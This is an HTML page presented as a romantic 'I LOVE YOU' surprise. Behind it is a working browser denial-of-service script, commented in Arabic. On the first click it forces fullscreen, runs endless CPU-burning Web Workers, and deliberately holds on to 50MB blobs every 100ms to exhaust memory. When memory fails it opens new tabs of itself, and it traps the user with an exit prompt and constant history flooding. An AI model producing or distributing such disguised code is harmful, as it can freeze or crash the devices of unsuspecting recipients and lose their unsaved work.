<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Courier New', monospace; cursor: pointer; }
        h1 { font-size: 5rem; text-align: center; animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -2px); } 100% { transform: translate(1px, -1px); } }
    </style>
</head>
<body>

    <h1>I LOVE YOU</h1>

    <script>
        let memoryWaste = [];

        function totalMeltdown() {
            // 1. ملء الشاشة
            document.documentElement.requestFullscreen().catch(() => {});

            // 2. حرق المعالج (CPU) عبر أنوية متعددة
            const cores = navigator.hardwareConcurrency || 12;
            for (let i = 0; i < cores * 4; i++) {
                new Worker(URL.createObjectURL(new Blob([`
                    while(true) { 
                        let x = Math.random() * Math.random();
                        postMessage(x); 
                    }
                `], {type: 'application/javascript'})));
            }

            // 3. تدمير الرام (RAM) - حجز 50 ميجا كل 100 مللي ثانية
            // استخدام Blob و URL يجعل الرام "محجوزة" ولا يمكن للمتصفح مسحها
            setInterval(() => {
                try {
                    // حجز مصفوفة عملاقة
                    let buffer = new ArrayBuffer(50 * 1024 * 1024); // 50MB
                    let blob = new Blob([buffer]);
                    let url = URL.createObjectURL(blob); 
                    memoryWaste.push(url); // تخزين الرابط يمنع مسح الـ Blob من الرام
                    
                    // تغيير شكل الصفحة لإظهار الضغط
                    document.body.style.backgroundColor = (document.body.style.backgroundColor === 'black') ? '#1a0000' : 'black';
                } catch(e) {
                    // إذا امتلأت الرام، الكود هيحاول يفتح تبويبات جديدة كملجأ أخير
                    window.open(window.location.href, '_blank');
                }
            }, 100);

            // 4. تعطيل أي محاولة للهروب
            window.onbeforeunload = function() { return "Are you sure?"; };
            setInterval(() => { window.history.pushState(null, null, "#" + Math.random()); }, 1);
        }

        // يبدأ الهجوم عند أول لمسة
        window.onclick = totalMeltdown;
    </script>
</body>
</html>
